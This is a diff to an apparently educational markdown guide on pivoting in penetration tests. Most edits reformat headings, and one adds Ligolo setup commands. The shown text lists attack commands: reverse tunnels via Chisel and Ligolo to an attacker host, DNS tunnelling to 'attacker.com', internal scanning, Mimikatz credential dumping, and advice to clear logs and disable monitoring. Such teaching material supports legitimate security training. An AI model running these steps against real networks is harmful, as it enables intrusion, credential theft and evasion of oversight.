@@ -17,11 +17,11 @@ Pivoting is a crucial technique in penetration testing that allows an attacker t
 
 ## Step-by-Step Guide to Pivoting
 
-1. Compromise an Initial Host
+1. ### Compromise an Initial Host
   - Gain access to an external system using exploits, phishing, or credentials.
   - Obtain a shell or remote desktop access.
 
-2. Identify Network Interfaces
+2. ### Identify Network Interfaces
   - Check available interfaces and network connections:
     ```bash
     ip a
@@ -32,26 +32,31 @@ Pivoting is a crucial technique in penetration testing that allows an attacker t
 
   Identify internal IP ranges that may indicate private networks.
 
-3. Enumerate Internal Network
+3. ### Enumerate Internal Network
   - Scan internal subnets using: `nmap -sP 10.10.0.0/24`
   - Check for active services: `nmap -sV -p 80,443,3389,445 10.10.0.10`
   - Extract credentials if possible (e.g., from memory dumps or configuration files).
 
-4. Establish Pivoting
-    - SSH Tunneling (Dynamic and Local Port Forwarding)
+4. ### Establish Pivoting
+    - #### SSH Tunneling (Dynamic and Local Port Forwarding)
         - Create a SOCKS proxy to route traffic: `ssh -D 1080 -N user@compromised-host`
         - Use local port forwarding to expose internal services: `ssh -L 8080:10.10.0.10:80 user@compromised-host`
         - Then use ProxyChains
             - Modify /etc/proxychains.conf to use SOCKS5 proxy: `socks5 127.0.0.1 1080`
             - Run tools through ProxyChains: `proxychains nmap -sT 10.10.0.0/24` 
-    - Chisel (Fast TCP/UDP Tunneling)
+    - #### Chisel (Fast TCP/UDP Tunneling)
         - On the attacker's machine (server): `./chisel server -p 8080 --reverse`
         - On the compromised machine (client): `./chisel client 192.168.1.100:8080 R:1080:socks`
         - Use ProxyChains with Chisel for further tunneling.
-    - Ligolo (Auto Route Creation)
+    - #### Ligolo (Auto Route Creation)
+        - Setup network configuration
+          ```bash
+              ip tuntap add user root mode tun ligolo
+              ip link set ligolo up
+          ```
         - On attacker's machine: `./ligolo -reverse -listen :9090`
         - On compromised machine: `./ligolo -connect attacker-ip:9090`
-    - Metasploit Pivoting
+    - #### Metasploit Pivoting
         - Use autoroute to add routes through the compromised system: `run autoroute -s 10.10.0.0/24`
         - Use socks4a module to enable ProxyChains:
           ```bash
@@ -59,22 +64,22 @@ Pivoting is a crucial technique in penetration testing that allows an attacker t
           set SRVPORT 1080
           exploit
           ```
-    - SSHuttle Pivoting
+    - #### SSHuttle Pivoting
         - Transparently route traffic through an SSH connection: `sshuttle -r user@compromised-host 10.10.0.0/24`
-    - Plink (PuTTY Link) Pivoting
+    - #### Plink (PuTTY Link) Pivoting
         - Windows-based SSH tunneling: `plink.exe -D 1080 -N user@compromised-host`
-    - RDP Pivoting
+    - #### RDP Pivoting
         - Use RDP to connect to internal machines: `xfreerdp /u:user /p:password /v:10.10.0.10`
-    - ICMP Tunneling
+    - #### ICMP Tunneling
         - Use tools like icmptunnel to route traffic over ICMP: `./icmptunnel -s attacker-ip`
-    - DNS Tunneling
+    - #### DNS Tunneling
         - Use iodine to tunnel traffic over DNS: `iodine -f -P password -r attacker.com`
   
-5. Routing Traffic Through Compromised Host
+5. ### Routing Traffic Through Compromised Host
   - Use Metasploit’s autoroute to configure routes: `run autoroute -s 10.10.0.0/24`
   - Scan the internal network from Metasploit: `run post/multi/manage/autoroute`
 
-6. Exploit Further and Move Laterally
+6. ### Exploit Further and Move Laterally
   - Use credentials to access other machines (Pass-the-Hash, RDP, SMB, etc.).
   - Dump credentials using Mimikatz:
     ```bash
@@ -83,7 +88,7 @@ Pivoting is a crucial technique in penetration testing that allows an attacker t
     ```
   - Use SMB relay attacks to gain further access.
 
-7. Maintain Access and Cover Tracks
+7. ### Maintain Access and Cover Tracks
   - Set up persistent backdoors (e.g., SSH keys, scheduled tasks).
   - Clear logs and disable security monitoring where possible.
 
